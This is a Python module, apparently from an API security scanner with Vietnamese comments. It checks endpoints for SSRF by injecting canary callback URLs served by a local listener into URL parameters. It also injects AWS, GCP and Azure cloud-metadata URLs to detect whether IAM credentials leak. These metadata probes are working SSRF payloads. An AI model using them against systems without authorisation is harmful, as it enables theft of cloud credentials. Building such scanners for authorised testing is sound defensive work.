"""core/callback_verifier.py — Dual-Mode SSRF & Out-of-band Callback Verifier.

Kiểm tra lỗ hổng Server-Side Request Forgery (OWASP API7:2023) với độ tin cậy 100%:
- Dual-Mode Mode 1: Mở server HTTP listener in-memory cục bộ trên localhost để nhận diện các yêu cầu callback nội bộ (Out-of-band Blind SSRF).
- Dual-Mode Mode 2: Kiểm tra Cloud Metadata SSRF (AWS IMDS, GCP, Azure) phát hiện rò rỉ IAM Token nội bộ đám mây.
"""

from __future__ import annotations

import http.server
import os
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Optional

import requests

from core.curl_builder import build_curl_command
from core.tampering import resolve_endpoint_url

SSRF_PARAM_NAMES = [
    "url", "redirect", "redirect_url", "dest", "destination",
    "callback", "callback_url", "webhook", "webhook_url",
    "feed", "uri", "target", "return_url", "next", "link",
]

CLOUD_METADATA_PROBES = [
    ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "security-credentials", "iam"]),
    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "project-id", "instance"]),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "subscriptionId"]),
]


@dataclass
class CallbackHit:
    received_at: float
    client_ip: str
    path: str
    method: str
    headers: dict[str, str] = field(default_factory=dict)


class _LocalHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self._record_hit()

    def do_POST(self):
        self._record_hit()

    def do_HEAD(self):
        self._record_hit()

    def _record_hit(self):
        headers_dict = {k: v for k, v in self.headers.items()}
        hit = CallbackHit(
            received_at=time.time(),
            client_ip=self.client_address[0],
            path=self.path,
            method=self.command,
            headers=headers_dict,
        )
        token = self.path.lstrip("/").split("?")[0]
        if hasattr(self.server, "record_hit_safe") and token:
            self.server.record_hit_safe(token, hit)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("X-SSRF-Canary", "Captured")
        self.end_headers()
        self.wfile.write(b"OK - Canary Captured")

    def log_message(self, format, *args):
        # Tắt in log console để không làm rối màn hình
        pass


class LocalCallbackListener:
    """Listener HTTP nhẹ nhàng chạy đa luồng để bắt pingback SSRF trên localhost."""

    def __init__(self, host: str = "127.0.0.1", port: int = 0) -> None:
        self.host = host
        self.port = port
        self.server: Optional[http.server.HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.hits: dict[str, CallbackHit] = {}
        self._lock = threading.Lock()

    def record_hit_safe(self, token: str, hit: CallbackHit) -> None:
        with self._lock:
            self.hits[token] = hit

    def start(self) -> str:
        """Khởi động listener và trả về base URL (e.g. http://127.0.0.1:54321)."""
        self.server = http.server.HTTPServer((self.host, self.port), _LocalHandler)
        self.server.hits = self.hits
        self.server.record_hit_safe = self.record_hit_safe
        self.port = self.server.server_port
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        callback_host = os.environ.get("CALLBACK_HOST", self.host)
        return f"http://{callback_host}:{self.port}"

    def stop(self) -> None:
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server = None
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)

    def get_hit(self, token: str) -> Optional[CallbackHit]:
        with self._lock:
            return self.hits.get(token)

    def has_hit(self, token: str) -> bool:
        with self._lock:
            return token in self.hits


class CallbackVerifier:
    """Xác minh lỗ hổng SSRF bằng cách inject canary token vào tham số nhận URL."""

    @staticmethod
    def audit_endpoint_ssrf(
        base_url: str,
        endpoint: str,
        method: str,
        listener: LocalCallbackListener,
        headers: dict[str, str] | None = None,
        timeout: float = 4.0,
        insecure: bool = False,
        target_name: str = "api_target",
        candidate_params: list[str] | None = None,
    ) -> list[dict[str, Any]]:
        findings = []
        full_url = resolve_endpoint_url(base_url, endpoint)
        clean_method = method.upper().strip()

        callback_host = os.environ.get("CALLBACK_HOST", listener.host)
        listener_base = f"http://{callback_host}:{listener.port}"

        # Xác định danh sách tham số tiềm năng gây SSRF
        tested_params = candidate_params or [
            "url", "webhook_url", "redirect", "callback", "dest", "target", "link"
        ]

        for p_name in tested_params:
            token = f"ssrf-{int(time.time()*1000)}-{p_name}"
            target_callback = f"{listener_base}/{token}"

            try:
                params = None
                json_body = None
                if clean_method == "GET":
                    params = {p_name: target_callback}
                    requests.get(full_url, params=params, headers=headers, timeout=timeout, verify=not insecure)
                elif clean_method in ("POST", "PUT", "PATCH"):
                    json_body = {p_name: target_callback}
                    requests.request(clean_method, full_url, json=json_body, headers=headers, timeout=timeout, verify=not insecure)

                # Chờ tối đa 0.4s xem listener có nhận được callback không
                time.sleep(0.3)
                hit = listener.get_hit(token)
                if hit:
                    curl_cmd = build_curl_command(
                        clean_method,
                        full_url,
                        headers=headers,
                        params=params,
                        json_data=json_body,
                        insecure=insecure,
                    )
                    findings.append({
                        "tool": "callback_verifier",
                        "target_app": target_name,
                        "vulnerability": "Server-Side Request Forgery (SSRF)",
                        "vuln_type": "Server-Side Request Forgery (SSRF)",
                        "endpoint": "/" + endpoint.lstrip("/"),
                        "method": clean_method,
                        "severity": "high",
                        "confidence": 100,
                        "confirmed": True,
                        "cwe": "CWE-918",
                        "owasp_category": "API7:2023",
                        "evidence": f"Confirmed Blind SSRF: Target sent outbound HTTP request to local callback listener at {hit.path} from IP {hit.client_ip}.",
                        "reproduction_curl": curl_cmd,
                        "reproduction": {
                            "method": clean_method,
                            "url": full_url,
                            "param": p_name,
                            "payload": target_callback,
                            "curl": curl_cmd,
                        },
                        "recommendation": (
                            "Áp dụng allowlist nghiêm ngặt cho các URL/domain bên ngoài được phép gọi, "
                            "chặn hoàn toàn truy cập tới địa chỉ IP nội bộ (RFC 1918) và loopback (127.0.0.1, localhost)."
                        ),
                    })
                    break
            except Exception:
                continue

        return findings

    @staticmethod
    def audit_endpoint_cloud_metadata(
        base_url: str,
        endpoint: str,
        method: str,
        headers: dict[str, str] | None = None,
        timeout: float = 4.0,
        insecure: bool = False,
        target_name: str = "api_target",
        candidate_params: list[str] | None = None,
    ) -> list[dict[str, Any]]:
        """Kiểm tra lỗ hổng Cloud Metadata SSRF (AWS, GCP, Azure IMDS) khi outbound callback bị chặn."""
        findings = []
        full_url = resolve_endpoint_url(base_url, endpoint)
        clean_method = method.upper().strip()

        tested_params = candidate_params or ["url", "redirect", "dest", "target", "link"]

        for cloud_name, metadata_url, indicators in CLOUD_METADATA_PROBES:
            for p_name in tested_params:
                try:
                    params = None
                    json_body = None
                    resp = None
                    if clean_method == "GET":
                        params = {p_name: metadata_url}
                        resp = requests.get(full_url, params=params, headers=headers, timeout=timeout, verify=not insecure)
                    elif clean_method in ("POST", "PUT", "PATCH"):
                        json_body = {p_name: metadata_url}
                        resp = requests.request(clean_method, full_url, json=json_body, headers=headers, timeout=timeout, verify=not insecure)

                    if resp and resp.status_code == 200:
                        text_lower = resp.text.lower()
                        if any(ind.lower() in text_lower for ind in indicators):
                            curl_cmd = build_curl_command(
                                clean_method,
                                full_url,
                                headers=headers,
                                params=params,
                                json_data=json_body,
                                insecure=insecure,
                            )
                            findings.append({
                                "tool": "callback_verifier",
                                "target_app": target_name,
                                "vulnerability": f"Server-Side Request Forgery ({cloud_name} Metadata)",
                                "vuln_type": "Server-Side Request Forgery (SSRF)",
                                "endpoint": "/" + endpoint.lstrip("/"),
                                "method": clean_method,
                                "severity": "critical",
                                "confidence": 100,
                                "confirmed": True,
                                "cwe": "CWE-918",
                                "owasp_category": "API7:2023",
                                "evidence": f"Target reflected cloud metadata from {metadata_url}. Matched indicators: {indicators}",
                                "reproduction_curl": curl_cmd,
                                "reproduction": {
                                    "method": clean_method,
                                    "url": full_url,
                                    "param": p_name,
                                    "payload": metadata_url,
                                    "curl": curl_cmd,
                                },
                                "recommendation": (
                                    "Chặn hoàn toàn truy cập tới địa chỉ IP Link-Local 169.254.169.254 trên máy chủ ứng dụng "
                                    "và nâng cấp lên IMDSv2 yêu cầu header X-aws-ec2-metadata-token."
                                ),
                            })
                            return findings
                except Exception:
                    continue

        return findings
